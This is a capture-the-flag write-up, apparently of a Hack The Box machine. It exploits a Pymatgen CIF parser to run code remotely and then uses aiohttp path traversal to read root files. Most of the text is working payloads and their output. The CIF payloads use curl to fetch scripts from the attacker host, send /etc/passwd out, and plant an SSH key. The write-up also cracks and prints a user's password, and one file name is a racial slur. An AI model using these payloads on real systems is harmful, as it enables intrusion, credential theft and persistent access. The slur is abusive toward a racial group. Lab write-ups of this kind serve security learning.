


the box summary:

- it starts with finding port 5000
- immediately it mentions something about a cif and what it is
- i found a recent CVE and its very similar to SSTI
	- we get a curl back but its blind we dont see results so its blind
- You cant get a reverse shell (?)
- alternative route is by using SSH


```
kali@kali ~> nmap -sC -sV -Pn 10.129.103.11
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-19 15:01 EDT
Stats: 0:01:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 15:03 (0:01:09 remaining)
Stats: 0:01:32 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 15:04 (0:01:30 remaining)
Nmap scan report for 10.129.103.11
Host is up (0.57s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Sat, 19 Oct 2024 19:02:54 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=10/19%Time=6714020E%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3
SF:\x20Python/3\.9\.5\r\nDate:\x20Sat,\x2019\x20Oct\x202024\x2019:02:54\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20
SF:html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=
SF:\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"wid
SF:th=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Chemi
SF:stry\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\
SF:x20href=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20\n\x
SF:20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x20class
SF:=\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"title\"
SF:>Chemistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>
SF:Welcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\
SF:x20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20I
SF:nformation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20
SF:contained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20clas
SF:s=\"buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<center
SF:><a\x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\"btn\">R
SF:egister</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\
SF:x20\x20</div>\n</body>\n<")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUB
SF:LIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x
SF:20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Con
SF:tent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>
SF:\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20
SF:response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400
SF:</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20
SF:version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Er
SF:ror\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20r
SF:equest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20
SF:</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.77 seconds

```



https://github.com/advisories/GHSA-vgv8-5cpj-qj2f




```
kali@kali ~> cat test.cif
data_5yOhtAoR
_audit_creation_date
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("curl http://10.10.14.74:80/test.sh");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "

```


```
10.129.103.11 - - [19/Oct/2024 15:28:37] "GET /s.sh HTTP/1.1" 302 -
10.129.103.11 - - [19/Oct/2024 15:34:46] "GET /test.sh HTTP/1.1" 302 -
```

by the way if it doesnt return a result its because when recieving any form of permission error (for example trying to read /etc/shadow) it will interrupt it and no request will be sent

```
data_5yOhtAoR
_audit_creation_date
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("curl -X POST http://10.10.14.74/upload -F 'files=@/etc/passwd'");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "

```


here i had used a hint from a friend interms of writing my own ssh key, creating a bash shell and executing it "could" also work

```
data_5yOhtAoR
_audit_creation_date
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("mkdir /home/app/.ssh && curl http://10.10.14.74:9999/authorized_keys -o /home/app/.ssh/authorized_keys");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "

```



```
kali@kali ~> cat nigger.cif
data_5yOhtAoR
_audit_creation_date
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("mkdir /home/app/.ssh && curl http://10.10.14.74:9999/authorized_keys -o /home/app/.ssh/authorized_keys");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "

```

```
kali@kali ~/H/chem> updog -p 9999
[+] Serving /home/kali/HTB/chem...
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:9999
 * Running on http://192.168.3.128:9999
Press CTRL+C to quit
10.129.103.11 - - [19/Oct/2024 16:24:24] "GET / HTTP/1.1" 200 -
10.129.103.11 - - [19/Oct/2024 16:25:03] "GET / HTTP/1.1" 200 -
10.129.103.11 - - [19/Oct/2024 16:25:11] "GET /authorized_keys HTTP/1.1" 200 -
10.10.14.74 - - [19/Oct/2024 17:55:13] "GET /authorized_keys HTTP/1.1" 304 -

```

now its time to set the permissions



here we can find a lovely database file... i wonder what it can store!, we find rosa's credentials so we just crack it using crack station

```
kali@kali ~/H/chem> scp -i id_rsa app@10.129.103.11:/home/app/instance/database.db database.db
database.db                                                                                                                                                                      100%   20KB  41.9KB/s   00:00
```

we get

```
rosa:unicorniosrosados
```

we su to that user and we get the user flag, a quick curl to check if the ssh portforward's working

we find out using netstat there is this really suspicious port open

```
rosa@chemistry:~$ netstat -tlnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

there is a port 8080? lets do a port forward and see what it is

```
kali@kali ~/H/chem> ssh -N -L 9991:127.0.0.1:8080 rosa@10.129.78.190
The authenticity of host '10.129.78.190 (10.129.78.190)' can't be established.
ED25519 key fingerprint is SHA256:pCTpV0QcjONI3/FCDpSD+5DavCNbTobQqcaz7PC6S8k.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:19: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.78.190' (ED25519) to the list of known hosts.
rosa@10.129.78.190's password:
```


```
kali@kali ~> curl http://127.0.0.1:9991
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Monitoring</title>
    <link rel="stylesheet" href="/assets/css/all.min.css">
    <script src="/assets/js/jquery-3.6.0.min.js"></script>
    <script src="/assets/js/chart.js"></script>
    <link rel="stylesheet" href="/assets/css/style.css">
    <style>
    h2 {
      color: black;
      font-style: italic;
    }

```

when accessing the website there is this list services webpage



#### REQUEST

```
GET /list_services HTTP/1.1

Host: 127.0.0.1:9991

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

X-Requested-With: XMLHttpRequest

Connection: keep-alive

Referer: http://127.0.0.1:9991/

Cookie: csrftoken=nJSvW0aV7Ae6AfHWvrbc6dmPhtXSRGJI

Sec-Fetch-Dest: empty

Sec-Fetch-Mode: cors

Sec-Fetch-Site: same-origin
```


#### RESPONSE

```
kali@kali ~> cat test.txt
ontent-Type: application/json; charset=utf-8
Content-Length: 643
Date: Sat, 19 Oct 2024 20:38:40 GMT
Server: Python/3.9 aiohttp/3.9.1  <----------------------- HERE

{"services": [" [ + ]  apparmor", " [ + ]  apport", " [ + ]  atd", " [ + ]  auditd", " [ - ]  console-setup.sh", " [ + ]  cron", " [ - ]  cryptdisks", " [ - ]  cryptdisks-early", " [ + ]  dbus", " [ - ]  grub-common", " [ - ]  hwclock.sh", " [ + ]  irqbalance", " [ - ]  iscsid", " [ - ]  keyboard-setup.sh", " [ + ]  kmod", " [ - ]  lvm2", " [ - ]  lvm2-lvmpolld", " [ + ]  netfilter-persistent", " [ + ]  networking", " [ - ]  open-iscsi", " [ + ]  open-vm-tools", " [ - ]  plymouth", " [ - ]  plymouth-log", " [ + ]  procps", " [ - ]  rsync", " [ + ]  rsyslog", " [ - ]  screen-cleanup", " [ + ]  ssh", " [ + ]  udev", " [ - ]  uuidd", ""]}HTTP/1.1 200 OK

Content-Type: application/json; charset=utf-8

Content-Length: 643

Date: Sat, 19 Oct 2024 20:38:40 GMT

Server: Python/3.9 aiohttp/3.9.1



{"services": [" [ + ]  apparmor", " [ + ]  apport", " [ + ]  atd", " [ + ]  auditd", " [ - ]  console-setup.sh", " [ + ]  cron", " [ - ]  cryptdisks", " [ - ]  cryptdisks-early", " [ + ]  dbus", " [ - ]  grub-common", " [ - ]  hwclock.sh", " [ + ]  irqbalance", " [ - ]  iscsid", " [ - ]  keyboard-setup.sh", " [ + ]  kmod", " [ - ]  lvm2", " [ - ]  lvm2-lvmpolld", " [ + ]  netfilter-persistent", " [ + ]  networking", " [ - ]  open-iscsi", " [ + ]  open-vm-tools", " [ - ]  plymouth", " [ - ]  plymouth-log", " [ + ]  procps", " [ - ]  rsync", " [ + ]  rsyslog", " [ - ]  screen-cleanup", " [ + ]  ssh", " [ + ]  udev", " [ - ]  uuidd", ""]}

```



aoihttp is smth we gotta look up

https://github.com/jhonnybonny/CVE-2024-23334

https://github.com/z3rObyte/CVE-2024-23334-PoC/blob/main/exploit.sh

this bash script we can see hes trying to access /static/, looking into the exploit


so we dont have static what do we have?

```
kali@kali ~> dirsearch -u http://127.0.0.1:9991/

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_127.0.0.1_9991/__24-10-19_16-36-58.txt

Target: http://127.0.0.1:9991/

[16:36:58] Starting:
[16:37:20] 403 -   14B  - /assets
[16:37:20] 403 -   14B  - /assets/

```


okay lets just change it to assets!

request:
```
GET /assets/../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1

Host: 127.0.0.1:9991

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Connection: keep-alive

Cookie: csrftoken=nJSvW0aV7Ae6AfHWvrbc6dmPhtXSRGJI

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: none

Sec-Fetch-User: ?1




```


response

```
HTTP/1.1 200 OK

Content-Type: application/octet-stream

Etag: "17fd638c3d6090a6-7c0"

Last-Modified: Fri, 11 Oct 2024 11:48:06 GMT

Content-Length: 1984

Accept-Ranges: bytes

Date: Sat, 19 Oct 2024 23:01:50 GMT

Server: Python/3.9 aiohttp/3.9.1



root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001:,,,:/home/app:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false

```


now for the root flag

```
GET /assets/../../../../../../../../../../../../../../../../../root/root.txt HTTP/1.1

Host: 127.0.0.1:9991

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Connection: keep-alive

Cookie: csrftoken=nJSvW0aV7Ae6AfHWvrbc6dmPhtXSRGJI

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: none

Sec-Fetch-User: ?1




```


response

```
HTTP/1.1 200 OK

Content-Type: text/plain

Etag: "17fff2bdacebc367-21"

Last-Modified: Sat, 19 Oct 2024 19:54:39 GMT

Content-Length: 33

Accept-Ranges: bytes

Date: Sat, 19 Oct 2024 23:04:48 GMT

Server: Python/3.9 aiohttp/3.9.1



b61d11727790da7e394d2be9347c5161

```